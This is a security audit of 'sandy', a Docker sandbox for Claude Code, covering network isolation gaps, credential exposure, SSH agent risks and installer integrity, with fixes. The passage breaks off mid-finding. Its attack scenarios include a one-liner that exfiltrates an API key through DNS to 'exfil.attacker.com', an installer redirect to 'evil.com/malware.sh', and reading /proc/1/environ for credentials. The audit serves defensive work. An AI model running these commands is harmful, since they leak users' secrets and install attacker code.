# Security Audit: sandy - Claude Code Sandbox

**Audit Date:** 2026-02-16
**Auditor:** Security Analyst
**Version:** Pre-release (main branch)
**Files Audited:** `sandy` (518 lines), `install.sh` (84 lines)

---

## Executive Risk Summary

**Overall Risk Level:** HIGH

This audit identified **4 CRITICAL** and **7 HIGH** severity security vulnerabilities in the sandy sandbox implementation. While sandy implements several security controls (read-only rootfs, network isolation, resource limits), significant gaps exist that could allow:

1. **Network isolation bypass via IPv6** (CRITICAL)
2. **Credential exposure via environment variables** (CRITICAL)
3. **Unprotected SSH agent access** (CRITICAL)
4. **Supply chain compromise via installer** (HIGH)
5. **Privilege escalation opportunities during container initialization** (HIGH)

**Key Concerns:**
- IPv6 traffic is completely unfiltered, bypassing all LAN isolation
- API keys and git tokens are visible to any process via `/proc` and `docker inspect`
- SSH agent socket has world-writable permissions
- Installer has no integrity verification mechanism
- `--dangerously-skip-permissions` removes critical user safety controls

**Recommendation:** Address all CRITICAL issues before public release. The tool is marketed as a security isolation tool, so these vulnerabilities significantly undermine its core value proposition.

---

## Findings

### 1. IPv6 Network Isolation Bypass

**Severity:** CRITICAL
**Location:** `sandy:318-349` (iptables rules)

**Description:**
The network isolation implementation only applies IPv4 iptables rules. IPv6 traffic is completely unfiltered, allowing containers to bypass all LAN isolation restrictions.

**Technical Details:**
- Lines 342-343 apply iptables rules to block RFC 1918 IPv4 ranges
- No corresponding ip6tables rules exist
- Modern networks often have IPv6 enabled by default
- Docker containers can have IPv6 addresses if the host/network supports it

**Impact:**
- Container can access LAN resources via IPv6 (e.g., `ping6 ff02::1` to discover neighbors)
- Private IPv6 addresses (fc00::/7, fe80::/10) are unrestricted
- Complete bypass of the advertised "NO LAN access" security guarantee

**Recommendation:**
```bash
# Add IPv6 blocking rules in apply_network_isolation():
if ip6tables -L >/dev/null 2>&1; then
    # Block IPv6 private ranges
    sudo ip6tables -I DOCKER-USER -i "$BRIDGE_NAME" -d fc00::/7 -j DROP      # Unique local
    sudo ip6tables -I DOCKER-USER -i "$BRIDGE_NAME" -d fe80::/10 -j DROP     # Link-local
    sudo ip6tables -I DOCKER-USER -i "$BRIDGE_NAME" -d ff00::/8 -j DROP      # Multicast
    # Or disable IPv6 entirely for the network:
    docker network create --ipv6=false ...
fi
```

---

### 2. Credential Exposure via Environment Variables

**Severity:** CRITICAL
**Location:** `sandy:437-438, 500`

**Description:**
Sensitive credentials (`ANTHROPIC_API_KEY`, `GIT_TOKEN`) are passed as environment variables, making them visible through multiple attack vectors.

**Technical Details:**
- Line 438: `ANTHROPIC_API_KEY` passed via `-e` flag
- Line 500: `GIT_TOKEN` passed via `-e` flag
- Environment variables are visible in:
  - `docker inspect <container>` (readable by anyone with docker access)
  - `/proc/<pid>/environ` (readable by any process in the container)
  - Process listings on some systems
  - Container logs if environment is printed during errors

**Attack Scenarios:**
1. Malicious code in the workspace reads `/proc/1/environ` to extract credentials
2. User runs `docker inspect` and accidentally shares output (logs, screenshots)
3. Error messages or debug output inadvertently log environment variables
4. Docker events/logs capture the environment variables

**Impact:**
- Full compromise of user's Anthropic API key
- Full compromise of GitHub access token (all repos, not scoped)
- Credentials could be exfiltrated to remote servers

**Recommendation:**
```bash
# Option 1: Use Docker secrets (requires swarm mode, not ideal for desktop tool)

# Option 2: Pass via tmpfs file with strict permissions
CRED_ENV_FILE="$(mktemp)"
chmod 600 "$CRED_ENV_FILE"
cat > "$CRED_ENV_FILE" <<EOF
ANTHROPIC_API_KEY=${ANTHROPIC_API_KEY}
GIT_TOKEN=${GIT_TOKEN}
EOF
RUN_FLAGS+=(--env-file "$CRED_ENV_FILE")

# Option 3: Inject via stdin to entrypoint (best for API key)
# Read from mounted ro file in entrypoint script, never export to environment
```

**Additional Hardening:**
- Mount credentials file at a randomized path to prevent hardcoded reads
- Use shorter-lived tokens if available (OAuth refresh tokens)
- Scope GitHub token to minimum required permissions

---

### 3. Insecure SSH Agent Socket Permissions

**Severity:** CRITICAL
**Location:** `sandy:entrypoint.sh:114, 121`

**Description:**
SSH agent socket is created with world-writable permissions (0777), allowing any process in the container to use the host's SSH keys.

**Technical Details:**
- Line 114 (entrypoint.sh): `fs.chmodSync(SOCK, 0o777);`
- Line 121 (entrypoint.sh): `chmod 777 /tmp/ssh-agent.sock`
- This gives unrestricted access to the SSH agent to all container processes
- SSH agent has access to all host SSH keys
- Claude Code runs arbitrary user-provided prompts that could include malicious operations

**Impact:**
- Malicious code can use SSH agent to authenticate to any service accessible by host keys
- Could push malicious commits, access private repositories, SSH to internal servers
- Effectively grants full SSH access of the host user to the sandboxed environment
- Defeats the entire purpose of sandboxing

**Recommendation:**
```bash
# Use uid/gid-specific permissions:
fs.chmodSync(SOCK, 0o600);  # Only root can access (or set to 1001 if claude user needs it)
# Better: use owner-only permissions and set ownership
fs.chmodSync(SOCK, 0o600);
fs.chownSync(SOCK, 1001, 1001);  # claude:claude
```

**Note:** If other processes need SSH access, they should be explicitly added to a group, not given world access.

---

### 4. Unprotected TCP SSH Agent Relay (macOS)

**Severity:** CRITICAL
**Location:** `sandy:464-487`

**Description:**
On macOS, SSH agent forwarding uses an unprotected TCP relay bound to localhost. Any process on the host can connect to this relay and use the SSH agent during the container's lifetime.

**Technical Details:**
- Lines 466-477: Node.js TCP relay listens on `127.0.0.1:$SSH_RELAY_PORT`
- No authentication mechanism
- Port is dynamically assigned (random high port)
- Relay runs for the entire duration of the sandy session
- Any process on host can scan for open ports and connect

**Attack Scenarios:**
1. Malware on host scans localhost ports, finds relay, uses SSH agent
2. Other users on multi-user macOS system can access the relay
3. Port number might be predictable or discoverable via process listing

**Impact:**
- Complete SSH agent compromise for the duration of the sandy session
- Affects all keys in the agent, not just git-related keys
- Could persist beyond intended git operations

**Recommendation:**
```javascript
// Option 1: Bind to 127.0.0.1 with random port + authentication token
const AUTH_TOKEN = crypto.randomBytes(32).toString('hex');
server.listen(0, '127.0.0.1', () => {
    // Pass token to container, validate on connection
});

// Option 2: Use Unix domain socket with tighter Docker Desktop integration
// (requires Docker Desktop API changes)

// Option 3: Warn users about the risk
warn "SANDY_SSH=agent exposes SSH agent via TCP relay during container lifetime"
warn "Other processes on this host can potentially access your SSH keys"

// Option 4: Use GitHub token instead (document as recommended approach)
```

---

### 5. Git Token Embedded in Container Git Config

**Severity:** HIGH
**Location:** `sandy:entrypoint.sh:155-156`

**Description:**
GitHub token is embedded in the git config using `url.insteadOf`, persisting it in plaintext within the container filesystem where any process can read it.

**Technical Details:**
```bash
git config --global url."https://oauth2:${GIT_TOKEN}@github.com/".insteadOf "git@github.com:"
```
- Token is written to `/home/claude/.gitconfig` (on tmpfs, but still readable)
- Any process can run `git config --get url."https://oauth2:..."`
- Git commands may log the URL with embedded token
- Token remains in config for entire session

**Impact:**
- Malicious code in workspace can extract GitHub token
- Git error messages might expose token in URLs
- Debug output or verbose git operations could log token

**Recommendation:**
```bash
# Option 1: Use git credential helper with ephemeral cache
git config --global credential.helper 'cache --timeout=3600'
echo "https://oauth2:${GIT_TOKEN}@github.com" | git credential approve

# Option 2: Use GIT_TERMINAL_PROMPT=0 and credential helper with script
# that reads from a file only accessible to the git process

# Option 3: Use GitHub CLI (gh) commands instead of git directly
# gh uses separate credential storage

# Avoid url.insteadOf with embedded tokens
```

---

### 6. Installer Supply Chain Vulnerability

**Severity:** HIGH
**Location:** `install.sh:11, 44-58`

**Description:**
The installer performs a curl-pipe-sh installation with no integrity verification, and allows arbitrary code download via environment variable override.

**Technical Details:**
- Line 11: `SANDY_URL` can be overridden by environment variable
- Line 51: Downloads from `$SANDY_URL` with no checksum verification
- No signature validation
- No hash verification
- TOCTOU race between download (line 51) and chmod +x (line 60)

**Attack Scenarios:**
1. Man-in-the-middle attack: attacker replaces download with malicious script
2. Malicious override: `SANDY_URL=http://evil.com/malware.sh ./install.sh`
3. Compromised GitHub account: attacker modifies sandy script on GitHub
4. DNS poisoning: redirects raw.githubusercontent.com to malicious server

**Impact:**
- Full compromise of user's system
- Could install keyloggers, steal credentials, establish persistence
- User has no way to verify authenticity of installed code

**Recommendation:**
```bash
# 1. Add checksum verification
SANDY_SHA256="expected_hash_here"  # Update with each release
DOWNLOADED_HASH=$(shasum -a 256 "$INSTALL_DIR/sandy" | cut -d' ' -f1)
if [ "$DOWNLOADED_HASH" != "$SANDY_SHA256" ]; then
    error "Checksum verification failed! Expected $SANDY_SHA256, got $DOWNLOADED_HASH"
    rm "$INSTALL_DIR/sandy"
    exit 1
fi

# 2. Use GPG signature verification (requires published key)
curl -fsSL "$SANDY_URL.sig" -o "$INSTALL_DIR/sandy.sig"
gpg --verify "$INSTALL_DIR/sandy.sig" "$INSTALL_DIR/sandy"

# 3. Restrict SANDY_URL to known-good sources
if [[ ! "$SANDY_URL" =~ ^https://raw\.githubusercontent\.com/rappdw/sandy/ ]]; then
    error "SANDY_URL must point to official repository"
    exit 1
fi

# 4. Document checksum in README for manual verification:
#    curl -fsSL $URL -o sandy
#    echo "$EXPECTED_SHA256  sandy" | shasum -a 256 -c -
#    chmod +x sandy && mv sandy ~/.local/bin/
```

---

### 7. iptables Failure Mode Allows LAN Access

**Severity:** HIGH
**Location:** `sandy:336-339`

**Description:**
If iptables rules fail to apply, the script only warns the user but continues execution, leaving the container with full LAN access.

**Technical Details:**
```bash
if ! sudo iptables -L DOCKER-USER -n &>/dev/null; then
    warn "WARNING: iptables DOCKER-USER chain not accessible — LAN isolation is NOT active."
    warn "The container may be able to reach your local network."
    return  # Returns but doesn't exit!
fi
```

**Impact:**
- Container can access entire LAN if iptables fails
- User might miss the warning in output
- Defeats core security promise: "Network: public internet only, NO LAN access"
- Could expose internal services, databases, admin interfaces

**Scenarios:**
- User not in sudoers file / no sudo access
- Docker configured without DOCKER-USER chain
- SELinux/AppArmor blocking iptables modifications
- Running on restricted/managed systems

**Recommendation:**
```bash
# Fail-closed security model:
if ! sudo iptables -L DOCKER-USER -n &>/dev/null; then
    error "CRITICAL: Cannot apply network isolation rules"
    error "LAN isolation is NOT active. Refusing to start container."
    error "Fix: Ensure your user has sudo access and Docker is properly configured"
    exit 1
fi

# Apply rules and verify they were applied:
for range in "${PRIVATE_RANGES[@]}"; do
    sudo iptables -I DOCKER-USER -i "$BRIDGE_NAME" -d "$range" -j DROP 2>/dev/null || {
        error "Failed to apply iptables rule for $range"
        cleanup_network_isolation
        exit 1
    }
done

# Verify rules are active:
if ! sudo iptables -L DOCKER-USER -n | grep -q "$BRIDGE_NAME"; then
    error "Network isolation rules not active after application"
    cleanup_network_isolation
    exit 1
fi
```

---

### 8. Race Condition: Container Start Before iptables Rules

**Severity:** HIGH
**Location:** `sandy:249, 372, 517`

**Description:**
Network is created before iptables rules are applied, creating a window where containers could be started without isolation.

**Technical Details:**
- Line 249: `ensure_network()` called, creates network
- Line 372: `apply_network_isolation()` called later
- Line 517: `docker run` starts container
- Time window between network creation and rule application

**Attack Scenarios:**
1. Concurrent sandy invocations: second instance starts before first applies rules
2. Attacker with docker access starts container on network before rules apply
3. Race condition if script is interrupted after network creation

**Impact:**
- Container could start with full LAN access
- Brief window of vulnerability during initialization

**Recommendation:**
```bash
# Reorder operations: apply rules immediately after network creation
ensure_network() {
    if ! docker network inspect "$NETWORK_NAME" &>/dev/null; then
        info "Creating isolated network..."
        docker network create \
            --driver bridge \
            --subnet 172.30.0.0/24 \
            -o com.docker.network.bridge.name="$BRIDGE_NAME" \
            "$NETWORK_NAME" >/dev/null

        # Apply isolation immediately after creation
        apply_network_isolation_inline  # Inline version without cleanup trap
    fi
}

# Or use --internal flag (but this blocks ALL internet, not just LAN):
docker network create --internal ...  # Too restrictive for this use case

# Better: Use iptables rules at network creation time via iptables hooks
```

---

### 9. macOS Has No Network Isolation Enforcement

**Severity:** HIGH
**Location:** `sandy:326-348`

**Description:**
On macOS, network isolation relies entirely on Docker Desktop's VM isolation, with no iptables rules enforced. The effectiveness of this isolation is not verified or guaranteed.

**Technical Details:**
- Line 327: `if [[ "$OS" == "Linux" ]]` - only Linux gets iptables
- macOS/Darwin users get no explicit LAN blocking
- Relies on Docker Desktop's VM network isolation (undocumented behavior)
- No way to verify isolation is actually working

**Impact:**
- macOS users may have LAN access despite security claims
- Behavior depends on Docker Desktop version and configuration
- Inconsistent security posture across platforms
- Users on macOS have false sense of security

**Recommendation:**
```bash
# Option 1: Detect and test isolation on macOS
if [[ "$OS" == "Darwin" ]]; then
    info "macOS detected: network isolation relies on Docker Desktop VM"

    # Run a test container to verify LAN is blocked
    TEST_RESULT=$(docker run --rm --network "$NETWORK_NAME" alpine ping -c 1 -W 1 192.168.1.1 2>&1 || true)
    if echo "$TEST_RESULT" | grep -q "1 packets received"; then
        error "LAN isolation test FAILED on macOS"
        error "Container can reach LAN IP 192.168.1.1"
        exit 1
    fi
    info "LAN isolation verified on macOS"
fi

# Option 2: Document limitations clearly
cat <<EOF
WARNING: On macOS, network isolation relies on Docker Desktop's VM isolation.
This has not been independently verified. For guaranteed LAN isolation, use Linux.
EOF

# Option 3: Use --internal network + HTTP proxy for internet (complex but secure)
```

---

### 10. Container-to-Container Communication Allowed

**Severity:** MEDIUM
**Location:** `sandy:346`

**Description:**
The iptables rule at line 346 allows all traffic between containers on the 172.30.0.0/24 network, enabling lateral movement if multiple sandy instances are running.

**Technical Details:**
```bash
sudo iptables -I DOCKER-USER -i "$BRIDGE_NAME" -d 172.30.0.0/24 -j ACCEPT
```
- Necessary for container's own IP to work
- But also allows container A (172.30.0.2) to reach container B (172.30.0.3)

**Impact:**
- Multiple sandy instances can communicate with each other
- Compromised container A could attack container B
- Reduces isolation between different projects/sandboxes
- Could leak data between sandbox sessions

**Recommendation:**
```bash
# Option 1: Use unique network per sandbox instance
NETWORK_NAME="sandy_${SANDBOX_NAME}"  # Per-project network

# Option 2: Add iptables rules to block container-to-container (except own IP)
CONTAINER_IP="172.30.0.x"  # Get from docker inspect after start
sudo iptables -I DOCKER-USER -i "$BRIDGE_NAME" -s "$CONTAINER_IP" -d 172.30.0.0/24 ! -d "$CONTAINER_IP" -j DROP

# Option 3: Use Docker network isolation features
docker network create --opt com.docker.network.bridge.enable_icc=false "$NETWORK_NAME"
# (But verify this doesn't break required functionality)
```

---

### 11. UID 1001 Hardcoded - Collision Risk

**Severity:** MEDIUM
**Location:** `sandy:Dockerfile:78`, `sandy:421`

**Description:**
The container user `claude` is hardcoded to UID 1001, which could collide with existing users on the host system, leading to unexpected permission issues.

**Technical Details:**
- Line 78 (Dockerfile): `useradd -m -s /bin/bash -u 1001 claude`
- Line 421: `--tmpfs /home/claude:size=512M,uid=1001,gid=1001`
- If host has a user with UID 1001, file ownership could be confused
- Workspace files created by container appear owned by host UID 1001

**Impact:**
- Files created in /workspace might be owned by wrong user on host
- Permission denied errors if host UID 1001 doesn't match invoking user
- Security boundary confusion if UID 1001 on host is privileged

**Scenarios:**
- Corporate systems with standardized UID ranges
- Multi-user systems where 1001 is already allocated
- Host UID 1001 has different permissions than invoking user

**Recommendation:**
```bash
# Use host user's UID dynamically:
HOST_UID=$(id -u)
HOST_GID=$(id -g)

# Pass to entrypoint:
RUN_FLAGS+=(-e "HOST_UID=$HOST_UID" -e "HOST_GID=$HOST_GID")

# In entrypoint.sh (as root):
if [ -n "${HOST_UID:-}" ] && [ "$HOST_UID" != "1001" ]; then
    usermod -u "$HOST_UID" claude
    groupmod -g "${HOST_GID:-$HOST_UID}" claude
    chown -R claude:claude /home/claude
fi

# Or use a high UID unlikely to collide (e.g., 65534 = nobody, or 50000+)
```

---

### 12. Symlink Attack Vectors on Workspace Mount

**Severity:** MEDIUM
**Location:** `sandy:252, 428`

**Description:**
The script does not verify that the workspace directory is not a symlink, potentially allowing access to unintended filesystem locations.

**Technical Details:**
- Line 252: `WORK_DIR="$(pwd)"` - uses current directory without validation
- Line 428: `-v "$WORK_DIR:/workspace"` - mounts whatever path was resolved
- No check if WORK_DIR is a symlink to sensitive location (e.g., /etc, /var/lib/docker)

**Attack Scenarios:**
1. User creates symlink: `ln -s /etc sensitive-project && cd sensitive-project && sandy`
2. Malicious script changes directory to symlinked sensitive location before running sandy
3. Workspace contains symlinks to sensitive files, which get mounted and become accessible

**Impact:**
- Container could gain read/write access to sensitive host directories
- Could modify host system configuration
- Could escape intended sandbox boundaries

**Recommendation:**
```bash
# Validate WORK_DIR is not a symlink:
WORK_DIR="$(pwd -P)"  # -P resolves all symlinks

# Additional validation:
if [ -L "$(pwd)" ]; then
    error "Current directory is a symlink. sandy must be run from a real directory."
    error "Current: $(pwd)"
    error "Resolves to: $(pwd -P)"
    exit 1
fi

# Verify it's under user's home or opt-in locations:
case "$WORK_DIR" in
    "$HOME"/*) ;;  # Under home, OK
    /tmp/*) warn "Running sandy in /tmp - this is unusual" ;;
    *)
        warn "Running sandy in $WORK_DIR (outside home directory)"
        warn "Press Ctrl+C to cancel, or wait 5 seconds to continue..."
        sleep 5
        ;;
esac
```

---

### 13. Privileged Root Execution Window

**Severity:** MEDIUM
**Location:** `sandy:entrypoint.sh:89-137`

**Description:**
The entrypoint runs as root for setup operations, creating a window where vulnerabilities in the setup code could be exploited with root privileges.

**Technical Details:**
- Lines 92-98: File operations as root (known_hosts copying)
- Lines 100-135: SSH setup as root
- Lines 104-115: Node.js relay runs as root
- Line 138: Privilege drop via gosu

**Attack Vectors:**
1. Vulnerability in Node.js interpreter during relay creation (lines 104-115)
2. Malicious content in `/tmp/host-ssh-known_hosts` exploiting parsing bugs
3. Race conditions in chown/chmod operations
4. Path traversal in file copy operations

**Impact:**
- Container escape if root process is compromised
- Could modify host filesystem via mounted volumes
- Kernel exploits more likely to succeed from root context

**Recommendation:**
```bash
# Minimize root operations:
# 1. Move as much as possible to non-privileged user
# 2. Validate inputs strictly before root operations

# In entrypoint.sh:
if [ -f "/tmp/host-ssh-known_hosts" ]; then
    # Validate file is not malicious before processing as root
    if [ $(stat -f%z "/tmp/host-ssh-known_hosts" 2>/dev/null || stat -c%s "/tmp/host-ssh-known_hosts") -gt 1048576 ]; then
        echo "known_hosts file too large, skipping" >&2
        rm /tmp/host-ssh-known_hosts
    else
        mkdir -p /home/claude/.ssh
        cp /tmp/host-ssh-known_hosts /home/claude/.ssh/known_hosts
        # ... rest of setup
    fi
fi

# Use --user flag in docker run to avoid root entirely:
# docker run --user 1001:1001 ...
# (But this limits what setup can be done)

# Or use a minimal init system that drops privileges earlier
```

---

### 14. DNS Exfiltration Not Prevented

**Severity:** MEDIUM
**Location:** `sandy:318-349` (network isolation)

**Description:**
While the network isolation blocks direct TCP/IP connections to LAN ranges, it does not prevent DNS-based data exfiltration.

**Technical Details:**
- iptables rules block connections to private IPs
- DNS queries are allowed (necessary for internet access)
- Data can be encoded in DNS queries: `<encoded-data>.attacker.com`
- DNS responses can also carry data

**Attack Scenarios:**
1. Malicious code encodes credentials in DNS queries: `echo $ANTHROPIC_API_KEY | base64 | xxd -p -c32 | xargs -I{} dig {}.exfil.attacker.com`
2. Slow exfiltration via DNS TXT queries
3. Use DNS tunnel tool (e.g., iodine, dnscat2)

**Impact:**
- Credentials could be exfiltrated despite network isolation
- Arbitrary data can be sent to attacker-controlled DNS servers
- Difficult to detect without deep packet inspection

**Recommendation:**
```bash
# Option 1: Restrict DNS to specific resolvers (limited effectiveness)
# Requires custom DNS server in container or iptables DNS rules

# Option 2: Use DNS request rate limiting
# iptables -A DOCKER-USER -i "$BRIDGE_NAME" -p udp --dport 53 -m limit --limit 10/min -j ACCEPT
# iptables -A DOCKER-USER -i "$BRIDGE_NAME" -p udp --dport 53 -j DROP

# Option 3: Log DNS queries for monitoring
# iptables -A DOCKER-USER -i "$BRIDGE_NAME" -p udp --dport 53 -j LOG --log-prefix "SANDY-DNS: "

# Option 4: Block long DNS queries (tunnel detection)
# iptables -A DOCKER-USER -i "$BRIDGE_NAME" -p udp --dport 53 -m length --length 512: -j DROP

# Option 5: Document limitation
warn "Note: DNS-based data exfiltration is not prevented by sandy"
warn "Sensitive data could be exfiltrated via DNS tunnel"

# Most practical: combine rate limiting + length limiting + logging
```

---

### 15. tmpfs Size Limits Could Cause DoS

**Severity:** LOW
**Location:** `sandy:420-421`

**Description:**
tmpfs size limits (1GB for /tmp, 512MB for /home/claude) could be exhausted by malicious or buggy code, causing operations to fail.

**Technical Details:**
- Line 420: `--tmpfs /tmp:size=1G`
- Line 421: `--tmpfs /home/claude:size=512M,uid=1001,gid=1001`
- If limits are hit, write operations fail with ENOSPC
- Could affect legitimate operations

**Impact:**
- Malicious code could intentionally fill tmpfs
- Could cause sandbox to become unusable
- Logs, temp files, caches would fail
- DoS against the sandbox

**Recommendation:**
```bash
# 1. Increase limits based on available memory:
TMPFS_SIZE="$(( AVAILABLE_MEM_GB > 8 ? 4 : 2 ))g"
RUN_FLAGS+=(--tmpfs "/tmp:size=$TMPFS_SIZE")

# 2. Monitor tmpfs usage:
# Add periodic check in container:
# watch -n 60 'df -h /tmp /home/claude | tail -2'

# 3. Document limits:
info "tmpfs limits: /tmp=1G, /home/claude=512M"

# 4. Provide environment variable for users to override:
SANDY_TMPFS_SIZE="${SANDY_TMPFS_SIZE:-1G}"
RUN_FLAGS+=(--tmpfs "/tmp:size=$SANDY_TMPFS_SIZE")
```

---

### 16. Credential Cleanup Unreliable on SIGKILL

**Severity:** MEDIUM
**Location:** `sandy:361-369, 371`

**Description:**
Credential cleanup relies on bash trap which doesn't execute on SIGKILL, potentially leaving credentials on disk.

**Technical Details:**
- Line 371: `trap cleanup EXIT`
- Trap handles EXIT, but not SIGKILL (signal 9)
- If sandy is killed with `kill -9`, trap doesn't run
- Credentials remain in `$CRED_TMPDIR`

**Impact:**
- Credentials could persist in /tmp after forced termination
- Other users on multi-user systems could read them
- System crash or power loss leaves credentials on disk

**Recommendation:**
```bash
# 1. Use process-tied tmpfs via /proc/<pid>/
# (Only accessible while process runs, auto-cleaned by kernel)

# 2. Create tmpdir in /dev/shm with restrictive permissions:
CRED_TMPDIR="/dev/shm/sandy-$$.$(head -c 8 /dev/urandom | xxd -p)"
mkdir -m 700 "$CRED_TMPDIR"

# 3. Use systemd-tmpfiles or OS temp dir cleanup
# (Relies on OS cleanup policies)

# 4. Add cleanup to Docker entrypoint:
# Entrypoint can clean up host tmpdir via mounted socket/shared location

# 5. Document risk and recommend periodic cleanup:
info "Tip: Run 'find /tmp -name '.credentials.json' -mtime +1 -delete' to clean stale credentials"

# Best: Use memfd_create (Linux) or anonymous mmap for truly ephemeral storage
```

---

### 17. --dangerously-skip-permissions Removes Safety Controls

**Severity:** HIGH
**Location:** `sandy:entrypoint.sh:160`

**Description:**
Claude Code is always invoked with `--dangerously-skip-permissions`, completely bypassing user confirmation for destructive operations.

**Technical Details:**
```bash
CLAUDE_CMD="claude --dangerously-skip-permissions --model ${SANDY_MODEL:-claude-opus-4-6} --teammate-mode tmux"
```
- This flag is hardcoded and non-optional
- User cannot opt into safer permission mode
- Claude can execute any bash command without confirmation

**Impact:**
- Destructive operations (rm -rf, git push --force, etc.) happen without user approval
- User loses control over what commands execute
- Could result in data loss or unintended modifications
- Removes a critical safety boundary

**Security Philosophy Conflict:**
- sandy is marketed as a security sandbox
- But it removes user permission controls that Claude Code provides
- Creates false sense of security: "It's sandboxed, so it's safe"
- But within the sandbox, Claude has unrestricted access to workspace

**Recommendation:**
```bash
# Option 1: Make it configurable
SANDY_SKIP_PERMISSIONS="${SANDY_SKIP_PERMISSIONS:-false}"
CLAUDE_CMD="claude --model ${SANDY_MODEL:-claude-opus-4-6} --teammate-mode tmux"
if [ "$SANDY_SKIP_PERMISSIONS" = "true" ]; then
    CLAUDE_CMD+=" --dangerously-skip-permissions"
fi

# Option 2: Remove it entirely, let users opt-in via args:
# sandy --dangerously-skip-permissions ...

# Option 3: Document why it's there and how to disable:
cat <<EOF
sandy runs with --dangerously-skip-permissions for smoother interaction.
To use permission prompts, set: SANDY_SKIP_PERMISSIONS=false sandy
EOF

# Option 4: Use settings.json instead:
# "skipDangerousModePermissionPrompt": false  (per-sandbox setting)

# Recommended: Remove the flag, let users explicitly enable if wanted
```

---

### 18. Sandbox Hash Collision Possible

**Severity:** LOW
**Location:** `sandy:255`

**Description:**
Sandbox names use only 8-character hash, creating collision risk via birthday paradox.

**Technical Details:**
- Line 255: `SHORT_HASH="${FULL_HASH:0:8}"`
- 8 hex chars = 32 bits = 2^32 possibilities (~4 billion)
- Birthday paradox: 50% collision chance after ~65,000 sandboxes
- If collision occurs, wrong sandbox is reused

**Impact:**
- Two different projects could share the same sandbox
- Credentials/settings could leak between projects
- Low probability but high consequence

**Recommendation:**
```bash
# Increase hash length:
SHORT_HASH="${FULL_HASH:0:16}"  # 64 bits = 2^64 possibilities

# Or use full hash:
SANDBOX_NAME="${DIR_BASE}-${FULL_HASH}"

# Or add date component:
SHORT_HASH="${FULL_HASH:0:8}"
SANDBOX_NAME="${DIR_BASE}-${SHORT_HASH}-$(date +%Y%m%d)"

# Add collision detection:
if [ -d "$SANDBOX_DIR" ]; then
    EXPECTED_PATH="$(cat "$SANDBOX_DIR/.workspace_path" 2>/dev/null || echo "")"
    if [ -n "$EXPECTED_PATH" ] && [ "$EXPECTED_PATH" != "$WORK_DIR" ]; then
        error "Sandbox hash collision detected!"
        error "Sandbox $SANDBOX_NAME is for $EXPECTED_PATH, not $WORK_DIR"
        exit 1
    fi
fi
```

---

### 19. No Docker Capability Dropping

**Severity:** MEDIUM
**Location:** `sandy:416-428` (RUN_FLAGS construction)

**Description:**
The container does not explicitly drop dangerous Linux capabilities, relying only on Docker defaults.

**Technical Details:**
- No `--cap-drop` flags specified
- Default Docker capabilities include:
  - CAP_NET_RAW (raw sockets, packet crafting)
  - CAP_AUDIT_WRITE (audit log manipulation)
  - CAP_CHOWN (change file ownership)
  - CAP_KILL (send signals to processes)
- While `--security-opt no-new-privileges:true` prevents gaining new privileges, existing capabilities remain

**Impact:**
- Container could craft raw packets for network attacks
- Could manipulate audit logs (if accessible)
- More attack surface than necessary

**Recommendation:**
```bash
# Add explicit capability drops:
RUN_FLAGS+=(--cap-drop ALL)  # Drop all capabilities
RUN_FLAGS+=(--cap-add CHOWN)  # Add back only what's needed
RUN_FLAGS+=(--cap-add SETUID)
RUN_FLAGS+=(--cap-add SETGID)
RUN_FLAGS+=(--cap-add DAC_OVERRIDE)  # If needed for file operations

# Test what capabilities are actually needed:
# Run sandy, then in container: capsh --print
# Identify minimum required set

# Most restrictive:
RUN_FLAGS+=(--cap-drop ALL)
# Then add back only if operations fail without them
```

---

### 20. No Seccomp Profile Specified

**Severity:** LOW
**Location:** `sandy:416-428` (RUN_FLAGS construction)

**Description:**
The container uses Docker's default seccomp profile rather than a custom, more restrictive profile.

**Technical Details:**
- No `--security-opt seccomp=profile.json` specified
- Default profile blocks ~44 syscalls (out of ~300+)
- Could use stricter profile to further reduce attack surface

**Impact:**
- More syscalls available than necessary
- Potential kernel exploit surface not minimized
- Minor issue (default profile is already quite restrictive)

**Recommendation:**
```bash
# Create custom seccomp profile:
cat > "$SANDY_HOME/seccomp.json" <<'EOF'
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64", "SCMP_ARCH_X86", "SCMP_ARCH_AARCH64"],
  "syscalls": [
    {
      "names": [
        "read", "write", "open", "close", "stat", "fstat", "lseek",
        "mmap", "mprotect", "munmap", "brk", "rt_sigaction",
        "execve", "getuid", "getgid", "geteuid", "getegid",
        "socket", "connect", "accept", "sendto", "recvfrom",
        "bind", "listen", "getsockname", "getpeername",
        "setsockopt", "getsockopt", "fork", "vfork", "clone",
        "wait4", "kill", "exit_group"
        # ... add all needed syscalls
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
EOF

# Use in docker run:
RUN_FLAGS+=(--security-opt seccomp="$SANDY_HOME/seccomp.json")

# Or use docker's default but document the option:
# SANDY_SECCOMP="${SANDY_SECCOMP:-default}"
# if [ "$SANDY_SECCOMP" != "default" ]; then
#     RUN_FLAGS+=(--security-opt seccomp="$SANDY_SECCOMP")
# fi
```

---

### 21. .claude.json Shared Between Sandboxes

**Severity:** LOW
**Location:** `sandy:376`

**Description:**
The `.claude.json` file is stored outside the sandbox directory and could potentially leak state between different sandbox instances if naming collisions occur.

**Technical Details:**
- Line 376: `CLAUDE_JSON="$SANDY_HOME/sandboxes/${SANDBOX_NAME}.claude.json"`
- If `SANDBOX_NAME` collides (see issue #18), different projects share `.claude.json`
- Contains theme settings, onboarding state, OAuth tokens

**Impact:**
- Minor information leakage between projects
- OAuth tokens potentially shared (higher severity)
- User preferences leak between sandboxes

**Recommendation:**
```bash
# Use full hash for .claude.json:
CLAUDE_JSON="$SANDY_HOME/sandboxes/${SANDBOX_NAME}-${FULL_HASH:8:8}.claude.json"

# Or store inside SANDBOX_DIR:
# (Currently avoided due to "overlapping Docker bind mounts" comment at line 375)
# But could use a subdirectory:
CLAUDE_JSON="$SANDBOX_DIR/.claude.json"
RUN_FLAGS+=(-v "$CLAUDE_JSON:/home/claude/.claude.json")

# Or accept the risk and document:
# "OAuth credentials are stored per-sandbox for convenience"
```

---

### 22. Settings.json Seeded from Host

**Severity:** INFO
**Location:** `sandy:277-279`

**Description:**
Sandbox settings are seeded from the host's `~/.claude/settings.json`, which could contain unexpected or malicious configuration.

**Technical Details:**
- Line 278: `cp "$HOME/.claude/settings.json" "$SANDBOX_DIR/settings.json"`
- No validation of settings content
- Settings could contain malicious hooks or commands

**Impact:**
- Low risk: settings are JSON config, limited attack surface
- Could configure Claude Code in unexpected ways
- Hooks or scripts in settings could be exploited

**Recommendation:**
```bash
# Validate settings before copying:
if [ -f "$HOME/.claude/settings.json" ]; then
    # Verify it's valid JSON:
    if jq empty "$HOME/.claude/settings.json" 2>/dev/null; then
